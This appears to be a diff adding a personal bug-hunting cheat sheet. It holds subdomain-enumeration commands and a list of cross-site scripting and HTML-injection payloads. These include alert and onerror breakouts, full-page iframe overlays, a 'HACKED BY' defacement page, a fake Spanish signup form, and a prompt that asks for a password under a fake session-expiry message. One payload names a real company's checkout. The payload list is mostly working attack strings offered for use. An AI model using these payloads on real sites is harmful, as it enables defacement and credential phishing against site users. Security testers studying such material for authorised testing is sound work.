@@ -1,0 +1,55 @@
+subsleuth
+python3 -m venv venv
+source venv/bin/activate
+----------------------------------
+subsleuth -l 3rdlevel.txt -w /home/tatsu_/subsleuth/wordlist.txt -o final2.txt
+
+subfinder -d dominios.txt -all -recursive -o subfinder.txt
+
+
+cat * | sort -u | tee -a dup.txt
+cat dup.txt | rev | cut -d "." -f 1,2,3 | sort -u | rev >> 3rdlevel.txt
+subfinder -dL 3rdlevel.txt -o final.txt
+subsleuth -l 3rdlevel.txt -w wordlist.txt -o final1.txt
+cat * | sort -u | tee -a done.txt
+
+cargas xss
+foo"><s/G/onLoAd=confirm(1337)>
+hello <a href="https://evil.com">Click here</a>
+tatsu"><i>tatsu</i>
+﻿
+ "><svg/onload=alert(/EMAIL/)>"@x.y //email
+
+ "><svg/onload=alert(document.domain)> //referer
+
+"><svg/onload=alert(document.domain)> //referer
+
+
+HTMLI:
+<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+
+
+
+RXSS:
+	
+IFrame:
+"> <iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0;bottom:0; width:100%; height:100%">
+
+"> <iframe src="https://www.google.com/" style="border: 0; position:fixed; top:0; left:0; right:0;bottom:0; width:100%; height:100%">
+
+"> <img src="https://cat-bounce.com/cb.png" style="position:fixed; top:0; left:0; width:100%; z-index:9999;">
+"> <iframe src="data:text/html;charset=utf-8,<!DOCTYPE html><html><head><link href='https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap' rel='stylesheet'><style>body{margin:0;padding:0;background:black url('https://c4.wallpaperflare.com/wallpaper/598/482/363/black-black-and-white-anonymous-hackers-wallpaper-preview.jpg') no-repeat center center fixed;background-size:cover;color:%2300ffcc;font-family:Orbitron;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;overflow:hidden;} .title{font-size:3em;animation:flicker 2s infinite;text-shadow: 0 0 15px %2300ffcc;} .msg{max-width:80%;font-size:1.2em;color:%23ddd;margin-top:20px;font-family:sans-serif;} @keyframes flicker{0%,19%,21%,100%{opacity:1;} 20%,22%{opacity:0;}}</style></head><body><div class='title'>ACCESS EXPLOITED</div><h2 style='color:%23ff0066'>HACKED BY Tätsú_</h2><img src='https://github.com/xKoutax/portfolio/blob/master/assets/images/tats.jpg?raw=true' style='width:180px;border-radius:10px;box-shadow:0 0 20px %2300ffcc;'><div class='msg'><p>Your system is vulnerable. This is not an attack, it's a wake-up call. By Anonymous.<br><strong>Check your configurations and patch your system!</strong></p></div><p style='font-style:italic;color:%23888;margin-top:30px;'>~ Security is just an illusion ~</p></body></html>" style="border:0;position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;z-index:999999;"></iframe>
+
+
+
+"> <iframe src="data:text/html;charset=utf-8,<!DOCTYPE html><html lang='es'><head><style>body{margin:0;padding:0;background:%23ffffff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;}.c{text-align:center;border:1px solid %23ddd;padding:30px;border-radius:10px;width:280px;}input{width:100%;padding:10px;margin:8px 0;border:1px solid %23ccc;border-radius:5px;}button{width:100%;padding:10px;background:%2328a745;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}</style></head><body><div class='c'><h2>Crear Cuenta</h2><form><input type='text' placeholder='Nombre'><input type='email' placeholder='Correo'><input type='password' placeholder='Contraseña'><button type='button'>Registrarse</button></form></div></body></html>" style="position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:999999;"></iframe>
+
+"\"> <iframe src=\"data:text/html;charset=utf-8,<!DOCTYPE html><html lang='es'><head><style>body{margin:0;padding:0;background:%23ffffff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;}.c{text-align:center;border:1px solid %23ddd;padding:30px;border-radius:10px;width:280px;}input{width:100%;padding:10px;margin:8px 0;border:1px solid %23ccc;border-radius:5px;}button{width:100%;padding:10px;background:%2328a745;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}</style></head><body><div class='c'><h2>Crear Cuenta</h2><form><input type='text' placeholder='Nombre'><input type='email' placeholder='Correo'><input type='password' placeholder='Contraseña'><button type='button'>Registrarse</button></form></div></body></html>\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:999999;\"></iframe>",
+
+
+"> <img src="x" onerror="confirm('XSS en Checkout Motorola: Datos en Riesgo')">
+
+
+"> <img src="x" onerror="const p=prompt('Su sesión ha expirado. Ingrese su contraseña para continuar:'); if(p) alert('Contraseña capturada: ' + p);">
+
+"><img src=x onerror=alert(document.domain)>
